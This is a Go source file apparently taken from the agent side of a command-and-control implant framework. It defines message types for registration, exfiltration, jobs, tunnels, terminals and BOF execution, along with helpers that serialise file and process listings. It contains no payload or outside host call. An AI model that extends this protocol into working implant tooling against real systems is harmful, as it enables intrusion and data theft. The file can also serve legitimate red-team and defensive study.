package protocol

import (
	"fmt"
	"time"
)

// ─── Agent-side pack constants ────────────────────────────────────────────────
// The shared Go implant bootstrap expects these handshake types to exist in the
// protocol package. Gopher uses msgpack envelopes for the initial registration
// and job/exfil side channels, matching the original extender.

const (
	INIT_PACK     = 1
	EXFIL_PACK    = 2
	JOB_PACK      = 3
	TUNNEL_PACK   = 4
	TERMINAL_PACK = 5
	BOF_PACK      = 6
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
	Reason    byte   `msgpack:"reason"`
}

type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

// ─── Agent runtime helpers ─────────────────────────────────────────────────────

type DirEntry struct {
	Name    string
	IsDir   bool
	Size    int64
	ModTime int64
}

type ProcessEntry struct {
	Pid     uint32
	PPid    uint32
	Name    string
	User    string
	Arch    string
	Session uint32
}

func NewDirEntry(name string, isDir bool, size int64, modTime int64) DirEntry {
	return DirEntry{Name: name, IsDir: isDir, Size: size, ModTime: modTime}
}

func NewProcessEntry(pid uint32, ppid uint32, name string, user string, arch string, session uint32) ProcessEntry {
	return ProcessEntry{Pid: pid, PPid: ppid, Name: name, User: user, Arch: arch, Session: session}
}

func MarshalDirEntries(entries []DirEntry) ([]byte, error) {
	files := make([]FileInfo, 0, len(entries))
	for _, entry := range entries {
		date := ""
		if entry.ModTime > 0 {
			date = time.Unix(entry.ModTime, 0).UTC().Format("02/01/2006 15:04")
		}
		files = append(files, FileInfo{
			Size:     entry.Size,
			Date:     date,
			Filename: entry.Name,
			IsDir:    entry.IsDir,
		})
	}
	return Marshal(files)
}

func MarshalProcessEntries(entries []ProcessEntry) ([]byte, error) {
	procs := make([]PsInfo, 0, len(entries))
	for _, entry := range entries {
		procs = append(procs, PsInfo{
			Pid:     int(entry.Pid),
			Ppid:    int(entry.PPid),
			Tty:     fmt.Sprintf("%d", entry.Session),
			Context: entry.User,
			Process: entry.Name,
		})
	}
	return Marshal(procs)
}

